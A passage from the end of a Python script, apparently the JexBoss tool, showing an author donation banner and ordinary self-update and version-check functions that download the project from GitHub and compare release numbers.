          GREEN + BOLD + " * Paypal: " + ENDC + " joaomatosf@gmail.com \n" +
          GREEN + BOLD + " * Bitcoin Address: " + ENDC + " 14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C \n" +
          GREEN + BOLD + " * URI: " + ENDC + " bitcoin:14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C?label=jexboss\n")


print(ENDC)

banner()


def auto_update():
    """
    Download and deploy the latest version
    :return: True if successfully updated
    """
    url = 'https://github.com/joaomatosf/jexboss/archive/master.zip'

    # backup of prior version
    if os.path.exists('old_version'):
        shutil.rmtree('old_version')
    shutil.copytree(".", "." + os.path.sep + "old_version")

    # download and extract of new version
    print(GREEN + " * Downloading the new version from %s." %url +ENDC )
    r = pool.request('GET', url)
    if r.status != 200:
        print(RED + " * Error: Could not complete the download of the new version. Check your internet connection." + ENDC)
        return False
    with open('master.zip', 'wb') as f:
        f.write(r.data)
    z = ZipFile('master.zip', 'r')
    print(GREEN + " * Extracting new version..." +ENDC)
    z.extractall(path='.')
    z.close()
    os.remove('master.zip')
    path_new_version = '.' + os.path.sep + 'jexboss-master'
    print(GREEN + " * Replacing the current version with the new version..."  + ENDC)
    for root, dirs, files in os.walk(path_new_version):
        for file in files:
            old_path = root.replace(path_new_version, '.') + os.path.sep
            old_file = root.replace(path_new_version, '.') + os.path.sep + file
            new_file = os.path.join(root, file)

            if not os.path.exists(old_path):
                os.makedirs(old_path)

            shutil.move(new_file, old_file)
    # remove extracted directory of the new version
    shutil.rmtree('.'+os.path.sep+'jexboss-master')

    return True

def check_updates():
    """
    Checks if there is new version available
    :return: boolean if there updates
    """
    url = 'http://joaomatosf.com/rnp/releases.txt'
    print(BLUE + " * Checking for updates in: %s **" % url + ENDC)
    header = {"User-Agent": "Checking for updates"}
    r = pool.request('GET', url, redirect=False, headers=header)

    if r.status != 200:
        print(RED + " * Error: could not check for updates ..." + ENDC)
        return False
    else:
        current_version = __version
        link = 'https://github.com/joaomatosf/jexboss/archive/master.zip'
        date_last_version = ''
        notes = []
        # search for new versions
        resp = str(r.data).replace('\\n','\n')
        for line in resp.split('\n'):
            if "#" in line:
                continue
            if 'last_version' in line:
                last_version = line.split()[1]
            elif 'date:' in line:
                date_last_version = line.split()[1]
            elif 'link:' in line:
                link = line
            elif '* ' in line:
                notes.append(line)
            elif 'version:' in line and 'last_' not in line:
                break
        # compare last_version with current version
        tup = lambda x: [int(y) for y in (x + '.0.0.0').split('.')][:3]
        if tup(last_version) > tup(current_version):
            print (
            GREEN + BOLD + "\n * NEW VERSION AVAILABLE: JexBoss v%s (%s)\n" % (last_version, date_last_version) + ENDC +
            GREEN + "   * Link: %s\n" % link +
            GREEN + "   * Release notes:")
            for note in notes:
                print ("      %s" % note)
            return True
        else:
            return False


if __name__ == "__main__":
    main()
